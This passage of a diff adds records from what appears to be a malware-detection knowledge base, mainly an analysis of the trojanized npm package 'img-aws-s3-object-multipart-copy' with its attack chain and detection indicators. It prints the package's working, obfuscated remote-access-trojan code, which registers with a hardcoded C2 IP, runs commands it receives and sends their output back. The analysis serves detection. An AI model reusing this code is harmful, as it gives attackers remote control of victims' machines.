+                  "how_to_detect": "Monitor for execution of MSI installers from untrusted sources, especially those that drop or execute VBS or AutoHotKey scripts. Detect repeated outbound connections to known C2 IPs/domains and HTTP POST requests containing screenshots or credential data. Flag processes that access browser, wallet, chat, FTP, or VPN client data and immediately initiate network exfiltration. Look for the presence of suspicious scripts or binaries in user or temp directories, and correlate these events with phishing email delivery or suspicious user activity."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202033_905711_snippet_3",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4226570129394531,
+              "code_similarity": 0.4657883644104004,
+              "behavior_similarity": 0.37952563166618347,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "let fetchInterval = 0x1388;\nlet intervalId = setInterval(fetchAndExecuteCommand, fetchInterval);\nconst clientInfo = {\n  'name': os.hostname(),\n  'os': os.type() + \" \" + os.release()\n};\nconst agent = new https.Agent({\n  'rejectUnauthorized': false\n});\nfunction registerClient() {\n  const _0x47c6de = JSON.stringify(clientInfo);\n  const _0x5a10c1 = {\n    'hostname': \"85.208.108.29\",\n    'port': 0x1bb,\n    'path': \"/register\",\n    'method': \"POST\",\n    'headers': {\n      'Content-Type': \"application/json\",\n      'Content-Length': Buffer.byteLength(_0x47c6de)\n    },\n    'agent': agent\n  };\n  const _0x38f695 = https.request(_0x5a10c1, _0x454719 => {\n    console.log(\"Registered with server as \" + clientInfo.name);\n  });\n  _0x38f695.on(\"error\", _0x1159ec => {\n    console.error(\"Problem with registration: \" + _0x1159ec.message);\n  });\n  _0x38f695.write(_0x47c6de);\n  _0x38f695.end();\n}\nfunction fetchAndExecuteCommand() {\n  const _0x2dae30 = {\n    'hostname': \"85.208.108.29\",\n    'port': 0x1bb,\n    'path': \"/get-command?clientId=\" + encodeURIComponent(clientInfo.name),\n    'method': \"GET\",\n    'agent': agent\n  };\n  https.get(_0x2dae30, _0x4a0c09 => {\n    let _0x41cd12 = '';\n    _0x4a0c09.on(\"data\", _0x5cbbc5 => {\n      _0x41cd12 += _0x5cbbc5.toString();\n    });\n    _0x4a0c09.on(\"end\", () => {\n      console.log(\"Received command:\", _0x41cd12);\n      if (_0x41cd12.startsWith('setInterval:')) {\n        const _0x1e3896 = parseInt(_0x41cd12.split(':')[0x1], 0xa);\n        if (!isNaN(_0x1e3896) && _0x1e3896 > 0x0) {\n          clearInterval(intervalId);\n          fetchInterval = _0x1e3896 * 0x3e8;\n          intervalId = setInterval(fetchAndExecuteCommand, fetchInterval);\n          console.log(\"Interval has been updated to \" + _0x1e3896 + \" seconds.\");\n        } else {\n          console.log(\"Invalid interval command received.\");\n        }\n      } else {\n        if (_0x41cd12.startsWith(\"cd \")) {\n          const _0x58bd7d = _0x41cd12.substring(0x3).trim();\n          try {\n            process.chdir(_0x58bd7d);\n            console.log(\"Changed directory to \" + process.cwd());\n          } catch (_0x2ee272) {\n            console.error(\"Change directory failed: \" + _0x2ee272);\n          }\n        } else if (_0x41cd12 !== \"No commands\") {\n          exec(_0x41cd12, {\n            'cwd': process.cwd()\n          }, (_0x5da676, _0x1ae10c, _0x46788b) => {\n            let _0x4a96cd = _0x1ae10c;\n            if (_0x5da676) {\n              console.error(\"exec error: \" + _0x5da676);\n              _0x4a96cd += \"\\nError: \" + _0x46788b;\n            }\n            postResult(_0x4a96cd);\n          });\n        } else {\n          console.log(\"No commands to execute\");\n        }\n      }\n    });\n  }).on(\"error\", _0x2e8190 => {\n    console.error(\"Got error: \" + _0x2e8190.message);\n  });\n}\nfunction postResult(_0x1d73c1) {\n  const _0xc05626 = {\n    'hostname': \"85.208.108.29\",\n    'port': 0x1bb,\n    'path': \"/post-result?clientId=\" + encodeURIComponent(clientInfo.name),\n    'method': \"POST\",\n    'headers': {\n      'Content-Type': \"text/plain\",\n      'Content-Length': Buffer.byteLength(_0x1d73c1)\n    },\n    'agent': agent\n  };\n  const _0x2fcb05 = https.request(_0xc05626, _0x448ba6 => {\n    console.log(\"Result sent to the server\");\n  });\n  _0x2fcb05.on('error', _0x1f60a7 => {\n    console.error(\"Problem with request: \" + _0x1f60a7.message);\n  });\n  _0x2fcb05.write(_0x1d73c1);\n  _0x2fcb05.end();\n}\nregisterClient();",
+                "code_behavior": "After postinstall, the extracted payload registers the infected host with a hardcoded C2 server (85.208.108.29), periodically polls for attacker-supplied commands, executes them using the system shell, and exfiltrates command output back to the C2 server, enabling persistent remote control and data theft.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a persistent command-and-control channel, executing arbitrary remote commands, and exfiltrating results are definitive behaviors of remote access trojans (RATs) and are never present in legitimate packages.",
+                  "violated_expectations": "Legitimate packages do not establish outbound C2 connections, poll for and execute arbitrary remote commands, or exfiltrate data to hardcoded IP addresses.",
+                  "similar_legitimate_use": "No legitimate package behavior matches this; this is classic C2 malware operation.",
+                  "key_indicators": [
+                    "Hardcoded C2 IP address (85.208.108.29)",
+                    "Periodic polling for remote commands via HTTPS",
+                    "Arbitrary command execution using exec",
+                    "Exfiltration of command results to remote server",
+                    "Registration of client host details with attacker infrastructure"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (if logo2.jpg payload is present and executed)",
+                  "file_location": "payload extracted from logo2.jpg, executed in memory",
+                  "required_permissions": [
+                    "network",
+                    "os",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
